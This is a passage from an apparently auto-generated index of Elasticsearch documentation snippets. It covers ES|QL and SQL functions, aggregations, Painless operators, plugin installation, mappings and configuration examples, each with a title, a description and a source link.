text\n```\n\n----------------------------------------\n\nTITLE: Using E Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the E() function which returns the mathematical constant e (Euler's number), approximately 2.718281828459045. The function takes no parameters and returns a double value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/e.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW E()\n```\n\n----------------------------------------\n\nTITLE: Filtering Functions with Multi-Character Wildcard in Elasticsearch SQL\nDESCRIPTION: Example of using SHOW FUNCTIONS with LIKE clause using percent (%) wildcard to match zero or more characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-functions.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSHOW FUNCTIONS LIKE 'A%';\n\n     name      |     type\n---------------+---------------\nAVG            |AGGREGATE\nABS            |SCALAR\nACOS           |SCALAR\nASIN           |SCALAR\nATAN           |SCALAR\nATAN2          |SCALAR\nASCII          |SCALAR\n```\n\n----------------------------------------\n\nTITLE: Installing Core Elasticsearch Plugins using Command Line\nDESCRIPTION: Shell command to install core Elasticsearch plugins using the elasticsearch-plugin utility. This general syntax requires the plugin name as an argument and must be run with appropriate permissions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/installation.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin install [plugin_name]\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Top Hits Aggregation for LAST\nDESCRIPTION: This JSON snippet shows the Elasticsearch aggregation equivalent to the SQL LAST function for a date field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_26\n\nLANGUAGE: JSON\nCODE:\n```\n\"top_hits\":{\"from\":0,\"size\":1,\"version\":false,\"seq_no_primary_term\":false,\"explain\":false,\"docvalue_fields\":[{\"field\":\"date\",\"format\":\"strict_date_optional_time_nanos\"}],\"sort\":[{\"date\":{\"order\":\"desc\",\"missing\":\"_last\",\"unmapped_type\":\"date\"}}]}}}}\n```\n\n----------------------------------------\n\nTITLE: Uploading Extension Using Python Requests\nDESCRIPTION: Python implementation for uploading extension file using the requests library with multipart form data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nimport requests\nfiles = {'file': open('/tmp/synonyms.zip','rb')}\nr = requests.put('https://api.elastic-cloud.com/api/v1/deployments/extensions/{}'.format(extension_id), files=files, headers= {'Authorization': 'ApiKey {}'.format(EC_API_KEY)})\n```\n\n----------------------------------------\n\nTITLE: KQL Function Warning Notice\nDESCRIPTION: Technical preview warning message for the KQL function indicating its experimental status and support limitations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/kql.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{warning}\nDo not use on production environments. This functionality is in technical preview and\nmay be changed or removed in a future release. Elastic will work to fix any issues, but features in technical preview\nare not subject to the support SLA of official GA features.\n:::\n```\n\n----------------------------------------\n\nTITLE: ESQL Min Function Comment\nDESCRIPTION: Generated comment header for ESQL's min function test case documentation, indicating that the file is auto-generated and should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_min.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Installing Smart Chinese Analysis Plugin in Elasticsearch\nDESCRIPTION: Command to install the analysis-smartcn plugin using Elasticsearch's plugin manager. This must be installed on every node in the cluster, and each node must be restarted afterward.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-smartcn.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-smartcn\n```\n\n----------------------------------------\n\nTITLE: Defining Number Class Methods in Java\nDESCRIPTION: This snippet shows the public methods of the java.lang.Number class. It includes methods for converting the number to various primitive types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_15\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Number {\n  byte byteValue()\n  short shortValue()\n  int intValue()\n  long longValue()\n  float floatValue()\n  double doubleValue()\n}\n```\n\n----------------------------------------\n\nTITLE: Date Histogram with COUNT Aggregation\nDESCRIPTION: Creates a date histogram showing hire counts per year. Combines DATE_TRUNC with STATS to aggregate employee counts by year, followed by sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_trunc.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL year = DATE_TRUNC(1 year, hire_date)\n| STATS hires = COUNT(emp_no) BY year\n| SORT year\n```\n\n----------------------------------------\n\nTITLE: P-Series Function Comment Header\nDESCRIPTION: Generated test case documentation header explaining the purpose of converting multivalued expressions into single values through P-Series multiplication and summation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_pseries_weighted_sum.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Querying Current Date and Time with NOW Function in Elasticsearch ESQL\nDESCRIPTION: This SQL query demonstrates the usage of the NOW function in Elasticsearch ESQL to retrieve the current date and time. The NOW function returns the current timestamp without any arguments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/now.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT NOW();\n```\n\n----------------------------------------\n\nTITLE: Dot Expander with Override Configuration\nDESCRIPTION: Shows configuration for the dot expander when override is set to true, which will replace existing values during conflicts instead of merging them.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"dot_expander\": {\n    \"field\": \"foo.bar\",\n    \"override\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Documents to Elasticsearch Index for Version 6 in JSON\nDESCRIPTION: Inserts a document into the Elasticsearch index for version 6, including title, content, and created_at fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nPOST /index/_doc\n{\n  \"title\": \"Title 5\",\n  \"content\": \"Elasticsearch is a powerful search engine.\",\n  \"created_at\": \"2024-12-16\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Synonym Filter with Synonyms File in Elasticsearch\nDESCRIPTION: Example of configuring a synonym filter using a synonyms file. The 'synonyms_path' option specifies the path to the synonym file relative to the config location.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"filter\": {\n    \"synonyms_filter\": {\n      \"type\": \"synonym\",\n      \"synonyms_path\": \"analysis/synonym-set.txt\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Cluster State Task Execution Context Restrictions\nDESCRIPTION: Forbidden cluster state reaction patterns that obstruct task batching. Developers should use Runnable variants instead.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_6\n\nLANGUAGE: java\nCODE:\n```\norg.elasticsearch.cluster.ClusterStateTaskExecutor$TaskContext#success(java.util.function.Consumer)\norg.elasticsearch.cluster.ClusterStateTaskExecutor$TaskContext#success(java.util.function.Consumer, org.elasticsearch.cluster.ClusterStateAckListener)\n```\n\n----------------------------------------\n\nTITLE: Including ESQL 'E' Function Documentation Sections\nDESCRIPTION: This snippet shows the structure of the documentation, including various sections related to the 'E' function using Markdown include directives.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/e.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/e.md\n:::\n\n:::{include} ../description/e.md\n:::\n\n:::{include} ../types/e.md\n:::\n\n:::{include} ../examples/e.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Converting WKT to Geometry with ST_WKTToSQL in Elasticsearch SQL\nDESCRIPTION: Converts a WKT (Well-Known Text) representation to a geometry object. This function takes a string containing WKT as input and returns the corresponding geometry object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-geo.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nST_WKTToSQL(\n    string <1>\n)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CAST(ST_WKTToSQL('POINT (10 20)') AS STRING) location;\n\n   location:s\nPOINT (10.0 20.0)\n```\n\n----------------------------------------\n\nTITLE: Finding Documents with Specific Ignored Field using term Query in Elasticsearch\nDESCRIPTION: This query uses the term query to find all documents where a specific field (@timestamp) was ignored at index time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-ignored-field.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n  \"query\": {\n    \"term\": {\n      \"_ignored\": \"@timestamp\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: Template text for applying the Apache License 2.0 to software projects. Includes placeholders for copyright year and owner information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xmp-commons-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n```\n\n----------------------------------------\n\nTITLE: Service Token Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Specifies the structure of a service token object in security configuration change events. It includes fields for the namespace, service, and token name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_29\n\nLANGUAGE: javascript\nCODE:\n```\n{\"namespace\":<string>,\"service\":<string>,\"name\":<string>}\n```\n\n----------------------------------------\n\nTITLE: Cartesian Centroid with Terms Aggregation\nDESCRIPTION: Shows how to combine cartesian_centroid as a sub-aggregation with terms aggregation to find central locations per city.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-centroid-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"cities\": {\n      \"terms\": { \"field\": \"city.keyword\" },\n      \"aggs\": {\n        \"centroid\": {\n          \"cartesian_centroid\": { \"field\": \"location\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Source Code Form License Notice Template\nDESCRIPTION: Standard notice text for source code files to indicate they are subject to the Mozilla Public License v2.0\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-common/licenses/httpclient-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nThis Source Code Form is subject to the terms of the Mozilla Public\\nLicense, v. 2.0. If a copy of the MPL was not distributed with this\\nfile, You can obtain one at http://mozilla.org/MPL/2.0/.\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Paths for Windows\nDESCRIPTION: Sets the data and logs paths for Elasticsearch on Windows systems using DOS paths with escaped backslashes in the elasticsearch.yml configuration file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/path.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\npath:\n  data: \"C:\\\\Elastic\\\\Elasticsearch\\\\data\"\n  logs: \"C:\\\\Elastic\\\\Elasticsearch\\\\logs\"\n```\n\n----------------------------------------\n\nTITLE: Requesting Variable Width Histogram Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to request a variable width histogram aggregation with a target of 2 buckets on the 'price' field in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-variablewidthhistogram-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"prices\": {\n      \"variable_width_histogram\": {\n        \"field\": \"price\",\n        \"buckets\": 2\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: DATE_DIFF Syntax\nDESCRIPTION: Defines the syntax for the DATE_DIFF function in Elasticsearch SQL. The function calculates the difference between two date or datetime values in specified units.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_27\n\nLANGUAGE: sql\nCODE:\n```\n\"DATE_DIFF(\n    string_exp, <1>\n    datetime_exp, <2>\n    datetime_exp) <3>\"\n```\n\n----------------------------------------\n\nTITLE: Installing mapper-murmur3 plugin in Elasticsearch\nDESCRIPTION: This command installs the mapper-murmur3 plugin using the Elasticsearch plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-murmur3.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install mapper-murmur3\n```\n\n----------------------------------------\n\nTITLE: Defining CJK Stop Words\nDESCRIPTION: Defines stop words for Chinese, Japanese, and Korean for Elasticsearch usage, linked to the respective Lucene document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_11\n\nLANGUAGE: markdown\nCODE:\n```\n`_cjk_` (Chinese, Japanese, and Korean)\n:   [CJK stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/cjk/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Mapping Configuration for Elasticsearch Painless Operators Documentation\nDESCRIPTION: YAML configuration that maps a page to the Elasticsearch Painless scripting language operators documentation URL. This mapping likely serves as a reference for documentation generation or site organization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/painless/current/painless-operators.html\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Normalizer and Querying Index\nDESCRIPTION: Shows how to create an index with a custom normalizer that applies lowercase and ASCII folding filters. Demonstrates indexing documents and querying them using term and match queries to show normalization effects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/normalizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT index\n{\n  \"settings\": {\n    \"analysis\": {\n      \"normalizer\": {\n        \"my_normalizer\": {\n          \"type\": \"custom\",\n          \"char_filter\": [],\n          \"filter\": [\"lowercase\", \"asciifolding\"]\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"foo\": {\n        \"type\": \"keyword\",\n        \"normalizer\": \"my_normalizer\"\n      }\n    }\n  }\n}\n\nPUT index/_doc/1\n{\n  \"foo\": \"BÀR\"\n}\n\nPUT index/_doc/2\n{\n  \"foo\": \"bar\"\n}\n\nPUT index/_doc/3\n{\n  \"foo\": \"baz\"\n}\n\nPOST index/_refresh\n\nGET index/_search\n{\n  \"query\": {\n    \"term\": {\n      \"foo\": \"BAR\"\n    }\n  }\n}\n\nGET index/_search\n{\n  \"query\": {\n    \"match\": {\n      \"foo\": \"BAR\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Write Consistency Level for Elasticsearch Bulk Request\nDESCRIPTION: Method to set the write consistency level for the bulk request, controlling the number of active shards required for write operations to be successful.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic BulkRequest setConsistencyLevel(WriteConsistencyLevel consistencyLevel) {\n    this.consistencyLevel = consistencyLevel;\n    return this;\n}\n```\n\n----------------------------------------\n\nTITLE: IP Truncation Function Comment\nDESCRIPTION: A generated comment header for an IP truncation function that explains it's auto-generated nature and purpose of truncating IP addresses to specified prefix lengths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/ip_prefix.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nTruncates an IP to a given prefix length.\n```\n\n----------------------------------------\n\nTITLE: Synopsis - Elasticsearch Reset Password Command\nDESCRIPTION: Command line syntax for the elasticsearch-reset-password tool showing all available options and parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/reset-password.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-reset-password\n[-a, --auto] [-b, --batch] [-E <KeyValuePair]\n[-f, --force] [-h, --help] [-i, --interactive]\n[-s, --silent] [-u, --username] [--url] [-v, --verbose]\n```\n\n----------------------------------------\n\nTITLE: Addition with 'def' Type in Painless\nDESCRIPTION: Demonstrates addition using the '+' operator with the 'def' type in Painless.  The 'def' type automatically handles type inference, influencing the addition operation's outcome.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_21\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 5+4; <1>\ndef y = x+2; <2>\n```\n\n----------------------------------------\n\nTITLE: Total Monotonic Metric Suffix Example\nDESCRIPTION: This snippet illustrates using the 'total' suffix for monotonic metrics, always increasing counter, providing an example with deleted documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_8\n\nLANGUAGE: none\nCODE:\n```\n\"es.indices.docs.deleted.total\"\n```\n\n----------------------------------------\n\nTITLE: EQL Single Numeric Filter Less Than\nDESCRIPTION: Filters processes where `serial_event_id` is less than 4. Validates conversion of EQL to contain a range condition with less than comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_2\n\nLANGUAGE: basic\nCODE:\n```\nprocess where serial_event_id < 4\n;\n\"range\":{\"serial_event_id\":{\"lt\":4\n;\n```\n\n----------------------------------------\n\nTITLE: Setting Elasticsearch Password Environment Variable\nDESCRIPTION: Bash command to set the ELASTIC_PASSWORD environment variable for local development. This uses a default password which should be changed in production environments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nexport ELASTIC_PASSWORD=\"changeme\"\n```\n\n----------------------------------------\n\nTITLE: Defining Object Class Methods in Java\nDESCRIPTION: This snippet shows the public methods of the java.lang.Object class. It includes the fundamental methods that all Java objects inherit.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_16\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Object {\n  boolean equals(Object)\n  int hashCode()\n  String toString()\n}\n```\n\n----------------------------------------\n\nTITLE: Alternative Stop Token Filter Placement\nDESCRIPTION: Shows how removing the original term before synonym expansion can allow matches for the expanded term\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-graph-tokenfilter.md#2025-04-21_snippet_7\n\nLANGUAGE: text\nCODE:\n```\nStop filter removes: foo\nSynonym rule: foo, bar => baz\nResult: Potential matches for baz\n```\n\n----------------------------------------\n\nTITLE: Def Type Equality Not Equals Examples\nDESCRIPTION: Shows equality not equals operations using the def type with both primitive and reference type values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_21\n\nLANGUAGE: painless\nCODE:\n```\ndef a = 0;\ndef b = 1;\nboolean c = a == b;\ndef d = new HashMap();\ndef e = new ArrayList();\nc = d == e;\n```\n\n----------------------------------------\n\nTITLE: GROK Pattern with Triple Quotes in ESQL\nDESCRIPTION: Demonstrates using triple quotes for GROK patterns to avoid escaping backslashes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_11\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1.2.3.4 [2023-01-23T12:15:00.000Z] Connected\"\n| GROK a \"\"\"%{IP:ip} \\[%{TIMESTAMP_ISO8601:@timestamp}\\] %{GREEDYDATA:status}\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Input Document with Conflicting Fields\nDESCRIPTION: Shows an example document with both a dotted field and an existing nested field that would conflict during expansion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo.bar\" : \"value2\",\n  \"foo\" : {\n    \"bar\" : \"value1\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Feature Importance Object Mapping\nDESCRIPTION: Index mapping configuration for feature importance results with nested type and dynamic properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_12\n\nLANGUAGE: json\nCODE:\n```\n\"ml.inference.feature_importance\": {\n  \"type\": \"nested\",\n  \"dynamic\": true,\n  \"properties\": {\n    \"feature_name\": {\n      \"type\": \"keyword\"\n    },\n    \"importance\": {\n      \"type\": \"double\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding multi-architecture support with qemu-user-static\nDESCRIPTION: Demonstrates how to use the multiarch/qemu-user-static image to add support for additional architectures like ARM64 in a Docker environment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/docker/README.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ docker run --rm --privileged multiarch/qemu-user-static --reset -p yes\n```\n\n----------------------------------------\n\nTITLE: Time Metric Example\nDESCRIPTION: This snippet showcases examples of metric naming conventions, focusing on using the 'time' suffix and avoiding the inclusion of specific units in the metric name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_3\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.jvm.collection.time\"\n```\n\n----------------------------------------\n\nTITLE: Translating SQL Term Equality Query to Elasticsearch JSON\nDESCRIPTION: This snippet demonstrates the translation of a simple SQL term equality query into an Elasticsearch term query. It checks for an exact match on the 'some.string' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT some.string FROM test WHERE some.string = 'value';\n```\n\nLANGUAGE: json\nCODE:\n```\n\"term\":{\"some.string.typical\":{\"value\":\"value\"\n```\n\n----------------------------------------\n\nTITLE: MV_MAX Function Documentation Includes\nDESCRIPTION: Markdown include directives for various documentation sections including parameters, description, types, and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_max.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/mv_max.md\\n:::\\n\\n:::{include} ../description/mv_max.md\\n:::\\n\\n:::{include} ../types/mv_max.md\\n:::\\n\\n:::{include} ../examples/mv_max.md\\n:::\n```\n\n----------------------------------------\n\nTITLE: Interactive Program Notice Template\nDESCRIPTION: Example notice text for interactive programs to display their copyright and license information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-langdetect-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Hashing Function Parameters\nDESCRIPTION: This snippet defines the parameters for an ESQL hashing function test case. It specifies a single parameter 'input' which is the data to be hashed by the function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/sha1.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`input`\n:   Input to hash.\n```\n\n----------------------------------------\n\nTITLE: DATE_PARSE Syntax\nDESCRIPTION: Defines the syntax for the DATE_PARSE function in Elasticsearch SQL. This function parses a string into a date using a specified format pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_39\n\nLANGUAGE: sql\nCODE:\n```\n\"DATE_PARSE(\n    string_exp, <1>\n    string_exp) <2>\"\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Unary Negative Operator in Painless\nDESCRIPTION: This snippet illustrates the usage of the unary negative operator '-' with different numeric types in Painless, showing its negation behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_10\n\nLANGUAGE: painless\nCODE:\n```\nint x = -1;\nlong y = -x;\n```\n\n----------------------------------------\n\nTITLE: Calculating Spatial Extent for Indian Airports\nDESCRIPTION: Uses ST_EXTENT_AGG to compute the bounding box of airport locations in India by filtering and aggregating geometric data\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_extent_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE country == \"India\"\n| STATS extent = ST_EXTENT_AGG(location)\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation in Markdown\nDESCRIPTION: Documentation block describing a 'number' parameter that accepts multivalue expressions. This appears to be part of an auto-generated test case documentation file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_sum.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Multivalue expression.\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Headers for HTTP Exporter\nDESCRIPTION: Example of adding custom headers to every request made by the HTTP exporter, useful for routing through proxies.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/monitoring-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.monitoring.exporters.my_remote:\n  headers:\n    X-My-Array: [abc, def, xyz]\n    X-My-Header: abc123\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Documentation template showing the 'field' parameter definition including type information and support for single/multi-valued inputs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_datetime.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`field`\n:   Input value. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Geo-shape Mapping in Elasticsearch\nDESCRIPTION: Creates an index named 'geocells' with a mapping for a 'geocell' field of type 'geo_shape'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-geo-grid-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT geocells\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geocell\": {\n        \"type\": \"geo_shape\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Default Date Format in Elasticsearch\nDESCRIPTION: The default date format used in Elasticsearch if no format is specified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n    \"strict_date_optional_time||epoch_millis\"\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rule for Knowledge Service\nDESCRIPTION: JSON configuration to filter and index ServiceNow Knowledge documents based on author name\nSOURCE: 